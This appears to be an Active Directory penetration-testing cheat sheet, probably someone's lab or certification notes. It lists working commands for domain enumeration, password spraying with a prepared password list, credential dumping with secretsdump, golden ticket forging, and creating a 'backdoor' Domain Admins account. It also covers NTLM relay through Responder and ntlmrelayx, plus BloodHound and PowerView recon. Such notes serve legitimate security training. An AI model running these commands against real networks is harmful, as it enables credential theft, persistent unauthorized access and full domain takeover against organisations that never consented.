## Discover domain name
```bash
nslookup $IP
```

## Discover NetBIOS name
```bash
nbtscan $IP
```

## LDAP extract users
```bash
ldapsearch -x -H ldap://$IP -b "dc=domain,dc=local" "(objectClass=*)" | head -20
ldapsearch -x -H ldap://$IP -b "dc=domain,dc=local" "(objectClass=user)" sAMAccountName | grep sAMAccountName | cut -d: -f2 | sort > users.txt
```

## LDAP extract computers
```bash
ldapsearch -x -H ldap://$IP -b "dc=domain,dc=local" "(objectClass=computer)" dNSHostName | grep dNSHostName | cut -d: -f2 | sort > computers.txt
```

## LDAP extract groups
```bash
ldapsearch -x -H ldap://$IP -b "dc=domain,dc=local" "(objectClass=group)" cn | grep "cn:" | cut -d: -f2
```

## SMB null session shares
```bash
netexec smb $IP -u '' -p '' --shares
```

## enum4linux-ng null session
```bash
enum4linux-ng -A $IP
```

## RPC null session
```bash
rpcclient -U "" -N $IP
```

## Create password list
```bash
cat > passwords.txt << 'EOF'
Password123!
Welcome123!
Summer2024!
Spring2024!
CompanyName2024!
EOF
```

## Password spray
```bash
netexec smb $IP -u users.txt -p passwords.txt --continue-on-success
```

## Test credentials across domain
```bash
netexec smb $IP -u serviceaccount -p crackedpassword --shares
```

## Dump domain credentials
```bash
impacket-secretsdump domain.local/username:password@$IP
```

## Dump SAM and SYSTEM locally
```
impacket-secretsdump -sam SAM -system -SYSTEM LOCAL
```

## Create golden ticket
```bash
impacket-ticketer -nthash aad3b435b51404eeaad3b435b51404ee -domain domain.local -domain-sid S-1-5-21-1234567890-1234567890-1234567890 administrator
```

## Create domain admin account
```cmd
net user backdoor Password123! /add /domain
net group "Domain Admins" backdoor /add /domain
```

## Check SMB relay targets
```bash
netexec smb 10.10.10.0/24 --gen-relay-list relay_targets.txt
```

## Run Responder
```bash
responder -I eth0 -wrf
```

## Setup ntlmrelayx
```bash
impacket-ntlmrelayx -tf targets.txt -smb2support
impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami"
```

## PowerView (Kali Source)
```
/usr/share/windows-resources/powersploit/Recon/PowerView.ps1
```

## PowerView enumerate domain
```powershell
Get-Domain
Get-DomainController
Get-DomainUser
Get-DomainGroup
Get-DomainComputer
```

## PowerView find unconstrained delegation
```powershell
Get-DomainComputer -Unconstrained
```

## PowerView find SPN users
```powershell
Get-DomainUser -SPN
```

## PowerView find accessible shares
```powershell
Find-DomainShare -CheckShareAccess
```

## PowerView find local admin access
```powershell
Find-LocalAdminAccess
Test-AdminAccess
```

## PowerView enumerate trusts
```powershell
Get-DomainTrust
Get-DomainTrustMapping
```

## PowerView enumerate GPOs
```powershell
Get-DomainGPO
Get-DomainGPO | Select-Object displayname,gpcfilesyspath
```


## SharpHound (Kali Source)
```
/usr/share/sharphound/SharpHound.exe
```

## Run SharpHound
```cmd
.\SharpHound.exe -c All -d domain.local --zipfilename bloodhound.zip
```

## Get password policy
```bash
netexec smb $IP -u username -p password --pass-pol
```

## Run ldapdomaindump
```bash
ldapdomaindump -u 'domain.local\username' -p password $IP
```

## Check MS17-010 EternalBlue
```bash
nmap -p 445 --script smb-vuln-ms17-010 $IP
```

## Password spray subnet
```bash
netexec smb 10.10.10.0/24 -u users.txt -p 'Password123!' --continue-on-success
```

## Test admin access multiple hosts
```bash
netexec smb 10.10.10.0/24 -u administrator -p password
```

---

# Reference

For extended AD methodology, decision trees, attack chain combinations, BloodHound analysis prioritization, and time management strategies, see [[AD Reference]]

**Use [[CHECKLIST-AD-Domain]] for systematic credential testing when you get new credentials.**
**Use [[CHECKLIST-Post-Exploitation]] after compromising each new host.**
